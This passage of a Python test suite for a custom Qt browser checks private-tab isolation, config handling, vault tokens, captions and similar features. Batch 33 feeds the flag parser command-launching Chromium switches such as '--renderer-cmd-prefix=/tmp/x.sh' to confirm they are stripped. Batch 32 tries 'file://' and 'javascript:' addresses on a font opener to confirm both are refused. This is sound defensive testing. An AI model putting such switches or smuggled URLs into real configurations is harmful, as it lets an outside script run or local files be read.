_cfg_text = B.CONFIG_FILE.read_text(encoding="utf-8")
B.CONFIG_FILE.write_text('{"theme": "mocha", "cut short', encoding="utf-8")
_bad_ok = _gr("cardX", True) if _gr else "missing"
_bad_after = B.CONFIG_FILE.read_text(encoding="utf-8")
B.CONFIG_FILE.write_text(_cfg_text, encoding="utf-8")
_good_ok = _gr("cardY", True) if _gr else "missing"
_good_after = B.json.loads(B.CONFIG_FILE.read_text(encoding="utf-8"))
br.save_config()
check("a graphics card choice leaves an unreadable config as it is",
      _bad_ok is False and _bad_after.endswith("cut short"), str(_bad_ok))
check("...and adds itself to a readable one without losing the rest",
      _good_ok is True and _good_after.get("gpuCard") == "cardY"
      and len(_good_after) > 3, str((_good_ok, len(_good_after))))

# a site rule whose proxy was deleted refuses the site, never goes direct
_routing = B._proxy_routing({"activeProxy": "direct", "proxyProfiles": [],
                             "proxyAuto": {"rules": [
                                 {"pattern": "bank.invalid",
                                  "profile": "gone"}]}})
_rp = B.RuleProxy([("bank.invalid", ("block",))], [], ("direct",))
import socket as _sock2
_c = _sock2.create_connection(("127.0.0.1", _rp.port), 5)
_c.sendall(b"CONNECT bank.invalid:443 HTTP/1.1\r\nHost: bank.invalid:443\r\n\r\n")
_c.settimeout(5)
try:
    _answer = _c.recv(64)
except OSError:
    _answer = b""
_c.close(); _rp.close()
check("a site rule whose proxy is gone refuses the site instead of going direct",
      _routing and _routing[0][0][1] == ("block",)
      and _answer.startswith(b"HTTP/1.1 502"), str((_routing, _answer)))

# his chat filter rules stay out of the page's reach
v34 = br.new_tab(); H.spin(300)
H.load(v34, srv.url("/chatpage")); H.spin(500)
# the start page's own loadFinished can end H.load before this page has
# even started under a CPU quota: wait for THIS document
H.wait_for(lambda: "/chatpage" in v34.url().toString()
           and jsq(v34, "document.readyState", B.MAIN_WORLD_ID) == "complete"
           and jsq(v34, "!!document.getElementById('c1')", B.MAIN_WORLD_ID),
           20000)
br.play_tool("chatfilter", view=v34,
             arg={"hide": ["spoiler"], "me": ["qwmyname"]})
H.wait_for(lambda: jsq(v34, "getComputedStyle(document.getElementById('c1'))"
                             ".display", B.MAIN_WORLD_ID) == "none", 20000)
_rules_seen = H.js(v34, "typeof window.__chatRules", B.MAIN_WORLD_ID)
_c1 = H.js(v34, "getComputedStyle(document.getElementById('c1')).display",
           B.MAIN_WORLD_ID)
check("the chat filter hides a line without handing the page his rules",
      _rules_seen == "undefined" and _c1 == "none", str((_rules_seen, _c1)))

# a private window's later tabs are private too, and no private tab's
# address is kept in the window state
_pw_win = br.new_private_window(); H.spin(800)
_pw_tab = _pw_win.new_tab(url=srv.url("/twhome")); H.spin(800)
_pw_ok = (getattr(_pw_tab, "private", False) is True
          and _pw_tab.page().profile().isOffTheRecord())
_ws_priv = br.new_tab(private=True); H.spin(300)
H.load(_ws_priv, srv.url("/twother?secret=1")); H.spin(400)
_ws = br.save_window_state()
check("a second tab in a private window is private as well",
      _pw_ok, str((getattr(_pw_tab, "private", None),)))
check("...and a private tab's address is not kept in the window state",
      not any("secret=1" in u for u in _ws.get("tabs", [])), str(_ws.get("tabs")))
for _t in (_ws_priv,):
    _close_if_open(_t)
try:
    _pw_win.close()
except RuntimeError:
    pass
H.spin(300)

# Settings is told what is saved, not only the first 177 keys
_set_keys = ("adBlock", "notesFolder", "snippetsText", "spoilerShield",
             "pauseForCalls", "formDraftsOn")
_set_was = {k: br.config.get(k, "__absent__") for k in _set_keys}
br.config.update(adBlock=True, notesFolder="/tmp/review-notes",
                 snippetsText=";a=b", spoilerShield=True, pauseForCalls=True)
br.config.pop("formDraftsOn", None)
_sset = B.json.loads(br.bridge.getSettings())
for _k, _v in _set_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
check("Settings is sent the switches and fields it shows, as saved",
      _sset.get("adBlock") is True and _sset.get("notesFolder") == "/tmp/review-notes"
      and _sset.get("snippetsText") == ";a=b" and _sset.get("spoilerShield") is True
      and _sset.get("pauseForCalls") is True,
      str({k: _sset.get(k) for k in _set_keys}))
check("...and an unsaved one with the browser's own default",
      _sset.get("formDraftsOn") is True, str(_sset.get("formDraftsOn")))

# ===== batch 31: the second pass's mediums ===========================
# the 1Password token still opens after the master passphrase changes
_tdir = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
_tl = B.VaultLock(_tdir)
_tl.write({"items": [{"host": "x", "password": "p"}]})
_tl.enable("first pass phrase")
_tl._token_store(b"op-token-xyz")
_tok_before = _tl._token_plain()
_changed = _tl.change("first pass phrase", "second pass phrase")
_tl2 = B.VaultLock(_tdir)
_tl2.unlock("second pass phrase")
check("a new master passphrase keeps the 1Password token readable",
      _tok_before == b"op-token-xyz" and _changed
      and _tl2._token_plain() == b"op-token-xyz",
      str((_tok_before, _changed, _tl2._token_plain())))

# lite mode on and off gives his own "block autoplay" back
_attr = B.QWebEngineSettings.WebAttribute.PlaybackRequiresUserGesture
_lite_keys = ("liteMode", "blockAutoplay", "blockAutoplayOwn")
_lite_was = {k: br.config.get(k, "__absent__") for k in _lite_keys}
br.config.update(liteMode=False, blockAutoplay=True)
br.config.pop("blockAutoplayOwn", None)
br.lite_mode(True); br.lite_mode(False)
_lite_on = (br.config.get("blockAutoplay"),
            br.profile.settings().testAttribute(_attr))
br.bridge.setSetting("blockAutoplay", "false")
br.lite_mode(True); br.lite_mode(False)
_lite_off = (br.config.get("blockAutoplay"),
             br.profile.settings().testAttribute(_attr))
for _k, _v in _lite_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.apply_web_attributes()
check("lite mode on and off keeps 'block autoplay' on when he had it on",
      _lite_on == (True, True), str(_lite_on))
check("...and off when he had it off", _lite_off == (False, False),
      str(_lite_off))

# a reader made from a private tab's selection opens in a private tab
_pv = br.new_tab(private=True); H.spin(300)
H.load(_pv, srv.url("/twhome"))
_real_rpt = br.read_page_tool
br.read_page_tool = (lambda name, view=None, then=None, **k:
                     then(json.dumps({"html": "<p>x</p>", "title": "t"})))
try:
    br.reader_from_selection(view=_pv)
finally:
    br.read_page_tool = _real_rpt
H.spin(300)
_rd = br.current()
check("a reader from a private selection opens in a private tab",
      _rd is not _pv and getattr(_rd, "private", False) is True,
      str(getattr(_rd, "private", None)))
if _rd is not _pv:
    _close_if_open(_rd)

# a cookie set by hand in a private tab goes into the private jar
br.tabs.setCurrentWidget(_pv); H.spin(200)
br.set_cookie("k31", "v31", secure=False)
H.wait_for(lambda: "k31=v31" in (jsq(_pv, "document.cookie",
                                      B.MAIN_WORLD_ID) or ""), 5000)
_pc = H.js(_pv, "document.cookie", B.MAIN_WORLD_ID) or ""
_nv = br.new_tab(url=None); H.spin(200)
H.load(_nv, srv.url("/twhome"))
_nc = H.js(_nv, "document.cookie", B.MAIN_WORLD_ID) or ""
br.tabs.setCurrentWidget(_pv); H.spin(200)
_rows = [r for r in br.site_cookies() if r.get("name") == "k31"]
check("a cookie set in a private tab reaches that tab",
      "k31=v31" in _pc, _pc)
check("...is listed for it, and stays out of the normal jar",
      _rows and "k31" not in _nc, str((len(_rows), _nc)))
_close_if_open(_nv)

# a private tab's fake place and user agent stay out of config.json
br.tabs.setCurrentWidget(_pv); H.spin(200)
_ph = _pv.url().host()
br.override_place(view=_pv, lat=1.5, lon=2.5)
br.set_agent(name="firefox", view=_pv)
_disk = json.loads(B.CONFIG_FILE.read_text() or "{}")
_gname = B.page_guard.GUARD_SCRIPT_NAME
_pscr = [s.sourceCode() for s in _pv.page().profile().scripts().find(_gname)]
_mscr = [s.sourceCode() for s in br.profile.scripts().find(_gname)]
check("a private tab's fake place is not written to config.json",
      _ph not in (br.config.get("fakePlaces") or {})
      and _ph not in (_disk.get("fakePlaces") or {}),
      str(br.config.get("fakePlaces")))
check("...but the private jar's guard has it, and the normal one not",
      any("1.5" in s and _ph in s for s in _pscr)
      and not any("1.5" in s and _ph in s for s in _mscr))
check("a private tab's user agent is not written to config.json",
      _ph not in br.agent_sites() and _ph not in (_disk.get("agentSites") or {}),
      str(br.agent_sites()))
check("...but the private jar is told it, and the normal jar not",
      "Firefox" in br.agent_for(_ph, private=True)
      and "Firefox" not in br.agent_for(_ph))

# "Off" in the slow-connection menu takes back the offline it switched on
_off_was = br.config.get("offline", False)
br.config["offline"] = False
br.throttle(view=_pv, profile="offline"); _o1 = br.config.get("offline")
br.throttle(view=_pv, profile="off"); _o2 = br.config.get("offline")
br.config["offline"] = True
br.throttle(view=_pv, profile="offline"); br.throttle(view=_pv, profile="off")
_o3 = br.config.get("offline")
br.config["offline"] = _off_was
br.config.pop("offlineByThrottle", None)
check("throttle Offline then Off leaves the browser online",
      _o1 is True and _o2 is False, str((_o1, _o2)))
check("...and his own offline switch is left alone", _o3 is True, str(_o3))

# nothing typed into a password field is kept for the recording
_rv = br.new_tab(url=None); H.spin(200)
H.load(_rv, srv.url("/pwform"))
# the form's own document: H.load can return on the start page's
# loadFinished, and the recorder then went into that one
H.wait_for(lambda: "/pwform" in _rv.url().toString()
           and jsq(_rv, "!!document.getElementById('p')"
                        " && document.readyState === 'complete'",
                   B.MAIN_WORLD_ID) is True, 15000)
H.js(_rv, B.PERF_JS.replace("PERFWANT", json.dumps({"recordClicks": True})),
     B.APP_WORLD_ID)
H.js(_rv, "['u','p'].forEach(function (id) { var el = document.getElementById(id);"
          " el.focus(); ['s','e','c'].forEach(function (k) {"
          " el.dispatchEvent(new KeyboardEvent('keydown', {key: k + id,"
          " bubbles: true})); }); }); 1", B.APP_WORLD_ID)
_keys = [r.get("key") for r in json.loads(
    H.js(_rv, "window.__recInputTake ? window.__recInputTake() : '[]'",
         B.APP_WORLD_ID) or "[]")]
check("keys typed in a password field are not kept for the recording",
      "su" in _keys and not any(str(k).endswith("p") for k in _keys),
      str(_keys))
_close_if_open(_rv)

# the transcript note keeps each line's time
class _Desk31:
    body = None

    def save_note(self, title="", body="", link="", tags=()):
        _Desk31.body = body
        return {"title": title}
_real_desk, _real_tr = br.desk, br.transcript
br.desk = lambda: _Desk31()
br.transcript = lambda view=None, then=None: then(
    [{"t": 75, "e": 80, "text": "hi"}, {"t": 3725, "text": "later"}])
try:
    br.transcript_to_note(view=_pv)
finally:
    br.desk, br.transcript = _real_desk, _real_tr
check("a transcript note stamps each line with its own time",
      _Desk31.body == "[1:15] hi\n[1:02:05] later", repr(_Desk31.body))

# captions without hours (openai-whisper) and with CRLF still go on
_cv = br.new_tab(url=None); H.spin(200)
H.load(_cv, srv.url("/vid"))
_cap = {}
br.put_captions_on_video(
    "WEBVTT\r\n\r\n00:03.000 --> 00:06.500 align:start\r\nhello there\r\n"
    "\r\n01:00:01.000 --> 01:00:02.000\r\nlater on\r\n",
    view=_cv, then=lambda r: _cap.update(r))
H.wait_for(lambda: _cap, 5000)
_cues = json.loads(H.js(_cv, "JSON.stringify([].slice.call("
                         "document.getElementById('v').textTracks[0].cues)"
                         ".map(function (c) { return [c.startTime, c.text]; }))",
                         B.MAIN_WORLD_ID) or "[]")
check("captions with mm:ss cue times and CRLF lines are put on the video",
      _cap.get("cues") == 2 and _cues == [[3, "hello there"], [3601, "later on"]],
      str((_cap, _cues)))
for _t in (_cv, _pv):
    _close_if_open(_t)
H.spin(300)

# ===== batch 32 =======================================================
# a font file from the menu: resolved against the page, web only, and
# private from a private tab
_fv = br.new_tab(url=None); H.spin(200)
H.load(_fv, srv.url("/twhome"))
_ft = br._open_font_file("/fonts/f.woff2", _fv)
H.wait_for(lambda: _ft is not None and _ft.url().toString(), 8000)
_ft_url = _ft.url().toString() if _ft is not None else ""
_ff = br._open_font_file("file:///etc/hostname", _fv)
_fj = br._open_font_file("javascript:alert(1)", _fv)
check("a font file's relative address opens on the page's own site",
      _ft_url == srv.url("/fonts/f.woff2"), _ft_url)
check("...and a file:// or javascript: one opens nothing",
      _ff is None and _fj is None, str((_ff, _fj)))
for _t in (_ft,):
    if _t is not None:
        _close_if_open(_t)
_pfv = br.new_tab(private=True); H.spin(200)
H.load(_pfv, srv.url("/twhome"))
_pft = br._open_font_file("/fonts/g.woff2", _pfv); H.spin(300)
check("...from a private tab, in a private tab",
      _pft is not None and getattr(_pft, "private", False) is True)
for _t in (_pft, _pfv):
    if _t is not None:
        _close_if_open(_t)

# a caption run whose download fails does not reuse the last run's files
import os as _os, stat as _stat
_cd = _Path(_tempfile.mkdtemp(dir=str(B.CONFIG_FILE.parent)))
(B.CONFIG_FILE.parent / "autocap.wav").write_bytes(b"\0" * 4000)
(B.CONFIG_FILE.parent / "autocap.vtt").write_text(
    "WEBVTT\n\n00:00:00.000 --> 00:00:02.000\nlast video's words\n")
_mk = _cd / "maker.sh"
_mk.write_text("#!/bin/sh\nexit 1\n")
_tr = _cd / "words.sh"
_tr.write_text("#!/bin/sh\ntouch '%s'\n" % (_cd / "ran"))
for _f in (_mk, _tr):
    _f.chmod(_f.stat().st_mode | _stat.S_IEXEC)
_tmp_before = set(_Path(_tempfile.gettempdir()).glob("browser-autocap-*"))
_cj = {}
br._caption_job("http://127.0.0.1:9/x.mp4", str(_mk), str(_tr), view=_fv,
                then=lambda r: _cj.update(done=r))
H.wait_for(lambda: "done" in _cj, 15000)
H.spin(500)
_tmp_after = set(_Path(_tempfile.gettempdir()).glob("browser-autocap-*"))
check("a caption run whose download failed transcribes nothing",
      _cj.get("done") == {} and not (_cd / "ran").exists(), str(_cj))
check("...and leaves no folder of its own behind",
      not (_tmp_after - _tmp_before), str(_tmp_after - _tmp_before))
for _n in ("autocap.wav", "autocap.vtt"):
    try:
        (B.CONFIG_FILE.parent / _n).unlink()
    except OSError:
        pass

# one fullscreen-bar poll at a time, ending with the bar
br.offer_fullscreen_rule("a.test", view=_fv)
_t1 = br._fsbar_timer
br.offer_fullscreen_rule("b.test", view=_fv)
_t2 = br._fsbar_timer
try:
    _t1_live = _t1.isActive()
except RuntimeError:
    _t1_live = False
check("a second fullscreen bar stops the first one's poll",
      _t2 is not _t1 and not _t1_live and _t2.isActive())
_t2._until = B.time.monotonic() - 1
H.wait_for(lambda: br._fsbar_timer is None, 3000)
check("...and the poll ends once the bar has timed out",
      br._fsbar_timer is None)

# translating a background tab translates that tab, not the one in front
_ta = br.new_tab(url=None, switch=False); H.spin(200)
H.load(_ta, srv.url("/twhome"))
_tb = br.new_tab(url=None); H.spin(200)
H.load(_tb, srv.url("/twhome"))
_loads = []
_ta.load = lambda u: _loads.append(("A", u.toString()))
_tb.load = lambda u: _loads.append(("B", u.toString()))
_tl_was = (br.config.get("translateLang"), br.config.get("captionTranslator"))
br.config["captionTranslator"] = ""
try:
    br.translate_page_now(view=_ta, lang=_tl_was[0] or "en")
finally:
    if _tl_was[0] is None:
        br.config.pop("translateLang", None)
    else:
        br.config["translateLang"] = _tl_was[0]
    if _tl_was[1] is None:
        br.config.pop("captionTranslator", None)
    else:
        br.config["captionTranslator"] = _tl_was[1]
check("translating a tab sends that tab, not the one in front",
      [w for w, _u in _loads] == ["A"], str(_loads))
for _t in (_ta, _tb):
    _close_if_open(_t)

# a bookmark restore keeps what was there in a backup first
_bk_was = list(br.bookmarks)
_bdir = br.bookmark_backup_dir()
_bdir.mkdir(parents=True, exist_ok=True)
(_bdir / "bookmarks-2001-01-01.json").write_text(json.dumps(
    [{"id": 1, "type": "link", "title": "old", "url": "https://old.example/",
      "parent": 0}]))
br.bookmarks = [{"id": 7, "type": "link", "title": "added today",
                 "url": "https://new.example/", "parent": 0}]
_before_names = set(br.bookmark_backups())
_rn = br.restore_bookmark_backup("bookmarks-2001-01-01.json")
_new_names = set(br.bookmark_backups()) - _before_names
_kept = any("new.example" in (_bdir / n).read_text() for n in _new_names)
br.bookmarks = _bk_was
br.save_bookmarks()
for _n in _new_names | {"bookmarks-2001-01-01.json"}:
    try:
        (_bdir / _n).unlink()
    except OSError:
        pass
check("restoring a bookmark backup first backs up what is there",
      _rn == 1 and _kept, str((_rn, sorted(_new_names))))

# a full-page capture gives a pinned element its own inline position back
_cpv = br.new_tab(url=None); H.spin(200)
H.load(_cpv, srv.url("/pinned"))
H.js(_cpv, B.capture.CLEAN_JS % "true", B.APP_WORLD_ID)
_mid = H.js(_cpv, "getComputedStyle(document.getElementById('h')).position",
            B.MAIN_WORLD_ID)
H.js(_cpv, B.capture.CLEAN_JS % "false", B.APP_WORLD_ID)
_aft = H.js(_cpv, "getComputedStyle(document.getElementById('h')).position",
            B.MAIN_WORLD_ID)
check("a capture pins a fixed header and gives back its inline fixed",
      _mid == "absolute" and _aft == "fixed", str((_mid, _aft)))
_close_if_open(_cpv)

# the mic test: a second Start stops the first stream
_mv = br.open_mic_test(); H.spin(800)
# the mic test's own document, not the new tab's first empty one: at a
# 30% CPU quota "complete" came from that one and the stub went into it
H.wait_for(lambda: "mictest" in _mv.url().toString()
           and jsq(_mv, "document.readyState === 'complete'"
                        " && !!document.getElementById('camstart')"
                        " && location.href.indexOf('mictest') >= 0",
                   B.MAIN_WORLD_ID) is True, 15000)
H.spin(500)
H.js(_mv, """(function () {
  window.__made = [];
  navigator.mediaDevices.getUserMedia = function (want) {
    var s;
    if (want.video) {
      var c = document.createElement('canvas'); c.width = 8; c.height = 8;
      c.getContext('2d').fillRect(0, 0, 8, 8);
      s = c.captureStream(1);
    } else {
      s = new AudioContext().createMediaStreamDestination().stream;
    }
    window.__made.push(s);
    return Promise.resolve(s);
  };
  return 1; })()""", B.MAIN_WORLD_ID)
# the page's own handler, called and awaited, twice: what is measured is
# what the second Start does to the first stream, not how a click lands
H.js(_mv, "window.__cs = []; window.__ce = [];"
          " document.getElementById('camstart').onclick().then("
          "function () { __cs.push(1); }, function (e) { __ce.push(String(e)); });"
          " 1", B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_mv, "window.__cs.length + window.__ce.length",
                        B.MAIN_WORLD_ID) >= 1, 15000)
H.js(_mv, "document.getElementById('camstart').onclick().then("
          "function () { __cs.push(2); }, function (e) { __ce.push(String(e)); });"
          " 1", B.MAIN_WORLD_ID)
H.wait_for(lambda: jsq(_mv, "window.__cs.length + window.__ce.length",
                        B.MAIN_WORLD_ID) >= 2, 15000)
_cam1 = H.js(_mv, "window.__made[0] && window.__made[0].getTracks()[0].readyState",
             B.MAIN_WORLD_ID)
H.js(_mv, "document.getElementById('camstop').click(); 1", B.MAIN_WORLD_ID)
H.spin(300)
_cam2 = H.js(_mv, "window.__made[1] && window.__made[1].getTracks()[0].readyState",
             B.MAIN_WORLD_ID)
_cdiag = H.js(_mv, "JSON.stringify([__made.length, __cs, __ce, location.href.slice(-30)])", B.MAIN_WORLD_ID)
check("a second camera Start stops the first camera stream",
      _cam1 == "ended" and _cam2 == "ended", str((_cam1, _cam2, _cdiag)))
if _mv is not None:
    _close_if_open(_mv)
for _t in (_fv,):
    _close_if_open(_t)
H.spin(300)

# ===== batch 33 =======================================================
# a launching switch in his flags is left out however it is quoted
for _line in ('--"renderer-cmd-prefix"=/tmp/x.sh',
              '"--renderer-cmd-prefix=/tmp/x.sh"',
              "-renderer-cmd-prefix=/tmp/x.sh",
              "--gpu-launcher='/tmp/x.sh'"):
    B.CONFIG_FILE.write_text(json.dumps({"chromiumFlags": _line}))
    _fl = B._startup_flags()
    check("a launching switch written as %s is left out" % _line,
          "cmd-prefix" not in _fl and "launcher" not in _fl, _fl)
B.CONFIG_FILE.write_text(json.dumps({"chromiumFlags": "--force-dark-mode"}))
check("...and an ordinary flag still goes through",
      "--force-dark-mode" in B._startup_flags())
B.CONFIG_FILE.write_text(json.dumps(br.config))

# no DevTools port unless he switched it on
check("no DevTools port is opened by default",
      B.REMOTE_DEBUG_PORT == 0
      and not B.os.environ.get("QTWEBENGINE_REMOTE_DEBUGGING"),
      str((B.REMOTE_DEBUG_PORT,
           B.os.environ.get("QTWEBENGINE_REMOTE_DEBUGGING"))))
_iv = br.new_tab(url=None); H.spin(200)
H.load(_iv, srv.url("/twhome"))
br.toggle_inspector()
_dt = getattr(_iv, "_devtools", None)
H.wait_for(lambda: _dt is not None and "devtools" in _dt.url().toString(), 10000)
check("...and the inspector still opens, on Qt's own devtools page",
      _dt is not None and _dt.url().toString().startswith("devtools://"),
      _dt.url().toString() if _dt is not None else None)
br.toggle_inspector()
check("...and closes again", getattr(_iv, "_devtools", None) is None)

# the wheel-volume tag is centred and says one percent sign
H.load(_iv, srv.url("/vid"))
br.media_tool("wheelvolume", view=_iv); H.spin(300)
H.js(_iv, "var v = document.getElementById('v'); v.style.cssText = "
          "'display:block;width:300px;height:200px'; v.dispatchEvent("
          "new WheelEvent('wheel', {deltaY: 100, bubbles: true,"
          " cancelable: true})); 1", B.MAIN_WORLD_ID)
H.spin(200)
_vm = H.js(_iv, "(function () { var t = document.getElementById('__volmark');"
                " return t ? JSON.stringify([t.style.left, t.textContent])"
                " : ''; })()", B.MAIN_WORLD_ID)
check("the wheel-volume tag is centred and reads like 95%",
      _vm and json.loads(_vm)[0] == "50%" and json.loads(_vm)[1].endswith("%")
      and not json.loads(_vm)[1].endswith("%%"), _vm)
_close_if_open(_iv)
H.spin(300)

# ===== batch 35: what is opened from a private tab stays private ======
_sp = br.new_tab(private=True); H.spin(300)
H.load(_sp, srv.url("/links"))
br.tabs.setCurrentWidget(_sp); H.spin(200)
_n0 = br.tabs.count()
br.super_drag(srv.url("/twhome"), kind="link", background=False); H.spin(400)
_dr = br.current()
check("a link dragged out of a private tab opens in a private tab",
      _dr is not _sp and getattr(_dr, "private", False) is True,
      str(getattr(_dr, "private", None)))
if _dr is not _sp:
    _close_if_open(_dr)
br.tabs.setCurrentWidget(_sp); H.spin(200)
_before = set(id(br.tabs.widget(i)) for i in range(br.tabs.count()))
br._nav_button_middle("reload"); H.spin(400)
_mid_new = [br.tabs.widget(i) for i in range(br.tabs.count())
            if id(br.tabs.widget(i)) not in _before]
check("a middle-click on Reload in a private tab opens a private tab",
      _mid_new and all(getattr(w, "private", False) for w in _mid_new),
      str([getattr(w, "private", None) for w in _mid_new]))
for _w in _mid_new:
    _close_if_open(_w)
br.tabs.setCurrentWidget(_sp); H.spin(200)
H.js(_sp, "getSelection().selectAllChildren(document.body); 1", B.MAIN_WORLD_ID)
_before = set(id(br.tabs.widget(i)) for i in range(br.tabs.count()))
_sel = {}
br.open_selection_links(view=_sp, then=lambda r: _sel.update(v=r))
H.wait_for(lambda: "v" in _sel, 5000); H.spin(400)
_sel_new = [br.tabs.widget(i) for i in range(br.tabs.count())
            if id(br.tabs.widget(i)) not in _before]
check("links opened from a private tab's selection are private tabs",
      _sel_new and all(getattr(w, "private", False) for w in _sel_new),
      str([getattr(w, "private", None) for w in _sel_new]))
for _w in _sel_new:
    _close_if_open(_w)
# searches and the Twitch chat: where they would go, not loaded
br.tabs.setCurrentWidget(_sp); H.spin(200)
_asked = []
_real_nt = br.new_tab
br.new_tab = lambda *a, **k: _asked.append(bool(k.get("private"))) or None
_real_panel = br.open_panel
br.open_panel = lambda *a, **k: _asked.append("panel") or True
# search_image asks first, modally: answered here, or offscreen it waits
# for ever (this hung the whole suite)
_real_q35 = B.QMessageBox.question
B.QMessageBox.question = staticmethod(
    lambda *a, **k: B.QMessageBox.StandardButton.Yes)
try:
    br.search_for("hello review", new_tab=True)
    br.search_image("https://img.example/a.png")
    br.open_twitch_chat("somechannel")
finally:
    br.new_tab = _real_nt
    br.open_panel = _real_panel
    B.QMessageBox.question = _real_q35
check("a search, an image search and a Twitch chat from a private tab "
      "open private", _asked == [True, True, True], str(_asked))
# HTTP auth in a private tab: no saved login goes out by itself
class _Auth35:
    user = None

    def setUser(self, u):
        _Auth35.user = u

    def setPassword(self, p):
        pass
_vault_ok = br.vault is not None and not br.vault_locked()
if _vault_ok:
    br.vault.set_entry("127.0.0.1", "http", "ada35", "pw35")
_real_gt = B.QInputDialog.getText
B.QInputDialog.getText = staticmethod(lambda *a, **k: ("", False))
# the same login in a NORMAL tab on the same page is filled -- without
# that, "nothing was filled in the private tab" proves nothing
br.tabs.setCurrentWidget(view); H.spin(200)    # opened from a normal tab
_nt35 = br.new_tab(url=None); H.spin(200)
H.load(_nt35, srv.url("/links"))
H.wait_for(lambda: "/links" in _nt35.url().toString(), 10000)
br._auth_tried = {}
# an earlier section leaves Vault Password off, and with it off nothing
# is ever filled -- which made the private check below pass for nothing
_vpw_was = br.config.get(B.VAULT_PASSWORD_KEY, "__absent__")
br.config[B.VAULT_PASSWORD_KEY] = True
try:
    _au_n = br._http_auth(srv.url("/links"), _Auth35(), view=_nt35)
    _user_n, _Auth35.user = _Auth35.user, None
    br._auth_tried = {}
    br.tabs.setCurrentWidget(_sp); H.spin(200)
    _au = br._http_auth(srv.url("/links"), _Auth35(), view=_sp)
finally:
    B.QInputDialog.getText = _real_gt
    if _vpw_was == "__absent__":
        br.config.pop(B.VAULT_PASSWORD_KEY, None)
    else:
        br.config[B.VAULT_PASSWORD_KEY] = _vpw_was
check("a normal tab is signed in with the saved login (the control)",
      _vault_ok and _au_n is True and _user_n == "ada35",
      str((_vault_ok, _au_n, _user_n)))
check("...and a private tab on the same page is not",
      _vault_ok and _Auth35.user is None and _au is False,
      str((_vault_ok, _Auth35.user, _au)))
_close_if_open(_nt35)
# a permission answered in a private tab leaves no trace in config.json
class _Req35:
    def __init__(self, origin):
        self._o = B.QUrl(origin)
        self.answer = None

    def permissionType(self):
        return _QWP.PermissionType.MediaAudioCapture

    def origin(self):
        return self._o

    def grant(self):
        self.answer = True

    def deny(self):
        self.answer = False
_pt_was = json.dumps(br.config.get("permissionTimes") or {}, sort_keys=True)
_pl_was = len(br.config.get("permissionLog") or [])
br._perm_widget = None
_rq = _Req35(srv.url("/"))
_real_qwp = B.QWebEnginePermission
B.QWebEnginePermission = lambda p: p
try:
    br._permission_requested(_rq, _sp.page())
finally:
    B.QWebEnginePermission = _real_qwp
H.spin(300)
_pc = getattr(br, "_perm_widget", None)
_pa = _pc.findChild(B.QToolButton, "permallow") if _pc is not None else None
if _pa is not None:
    _pa.click(); H.spin(500)
check("a private tab's permission answer is not logged in config.json",
      _pa is not None and _rq.answer is True
      and json.dumps(br.config.get("permissionTimes") or {}, sort_keys=True) == _pt_was
      and len(br.config.get("permissionLog") or []) == _pl_was,
      str((_pa is not None, _rq.answer, len(br.config.get("permissionLog") or []), _pl_was)))
br._perm_widget = None
_close_if_open(_sp)
H.spin(300)

# ===== batch 36: a block list blocks the names under each site too =====
_bf = " ".join(B._privacy_flags({"blockHosts": ["www.example.test"],
                                 "blockReplay": True}))
check("a blocked site's subdomains are blocked as well",
      "MAP example.test 0.0.0.0" in _bf and "MAP *.example.test 0.0.0.0" in _bf
      and "MAP *.hotjar.com 0.0.0.0" in _bf, _bf[:200])
_big = B._privacy_flags({"blockHosts": ["h%05d.example" % i for i in range(5000)]})
_bigr = [f for f in _big if f.startswith("--host-resolver-rules")][0]
check("...and a long list is cut at whole pairs, under the cap",
      len(_bigr) < 60100 and _bigr.rstrip('"').endswith(" 0.0.0.0")
      and _bigr.count("MAP *.") == _bigr.count("MAP ") // 2, len(_bigr))

# a saved auto-hide is applied when a window starts
br.config["autoHideChrome"] = True
_ah = br.new_private_window(); H.spin(600)
_ah_shown = getattr(_ah, "_chrome_shown", True)
br.config["autoHideChrome"] = False
try:
    _t = getattr(_ah, "_peek_timer", None)
    if _t is not None:
        _t.stop()
    _ah.close()
except RuntimeError:
    pass
H.spin(300)
check("a saved auto-hide toolbar is hidden when a window starts",
      _ah_shown is False, str(_ah_shown))

# a second appearance reset keeps the first one's backup
_ap_was = {k: br.config.get(k, "__absent__")
           for k in ("customThemes", "theme", "appearanceBackup")}
br.config["customThemes"] = {"review-own": {"bg": "#101010"}}
br.reset_appearance()
br.reset_appearance()
_ap_bk = br.config.get("appearanceBackup") or {}
for _k, _v in _ap_was.items():
    if _v == "__absent__":
        br.config.pop(_k, None)
    else:
        br.config[_k] = _v
br.load_custom_themes()
br.apply_theme(br.config.get("theme", B.DEFAULT_THEME), save=False)
check("a second appearance reset keeps his own themes in the backup",
      "review-own" in (_ap_bk.get("customThemes") or {}), str(_ap_bk)[:200])

# ===== batch 37: page look per site, and by the clock ==================
_la = br.new_tab(url=None); H.spin(200)
H.load(_la, srv.url("/twhome"))
_lb = br.new_tab(url=None); H.spin(200)
H.load(_lb, srv.url("/twhome").replace("127.0.0.1", "localhost"))
br.tabs.setCurrentWidget(_la); H.spin(200)
br.set_site_font_size("127.0.0.1", 23); H.spin(600)
_fa = H.js(_la, "getComputedStyle(document.documentElement).fontSize",
           B.MAIN_WORLD_ID)
_fb = H.js(_lb, "getComputedStyle(document.documentElement).fontSize",
           B.MAIN_WORLD_ID)
br.set_site_font_size("127.0.0.1", None); H.spin(300)
check("a site's own text size is used on that site only",
      _fa == "23px" and _fb != "23px", str((_fa, _fb)))
_now_m = B.time.localtime().tm_hour * 60 + B.time.localtime().tm_min
def _look_filter(frm, to):
    pay = dict(br.page_look_payload(), dim=30, warm=0,
               eveFrom=frm % 1440, eveTo=to % 1440)
    H.js(_la, B.PAGE_LOOK_JS.replace("PAYLOAD", json.dumps(pay)),
         B.APP_WORLD_ID)
    return H.js(_la, "document.documentElement.style.filter", B.MAIN_WORLD_ID)
_in = _look_filter(_now_m - 5, _now_m + 5)
_out = _look_filter(_now_m + 10, _now_m + 20)
H.js(_la, B.PAGE_LOOK_JS.replace("PAYLOAD", json.dumps(br.page_look_payload())),
     B.APP_WORLD_ID)
check("the night dimmer is decided by the clock when the page loads",
      "brightness(0.7)" in (_in or "") and "brightness" not in (_out or ""),
      str((_in, _out)))
for _t in (_la, _lb):
    _close_if_open(_t)
H.spin(300)

# ===== batch 38: the lows that touch security and privacy ==============
# a refused popup's row opens web addresses only
_pp = br.new_tab(url=None); H.spin(200)
